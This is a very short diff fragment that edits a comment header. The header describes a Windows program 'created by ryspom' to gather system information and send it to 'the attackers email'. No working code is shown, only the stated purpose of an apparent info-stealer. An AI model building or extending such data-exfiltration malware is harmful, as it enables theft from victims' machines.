@@ -1,4 +1,4 @@
-cmd/*
+/*
  * Created by ryspom, to get valuable system information and send it back to the attackers email.
  * It should work with windows 7, but it is only tested on windows 10 machines(works perfect!)
  */
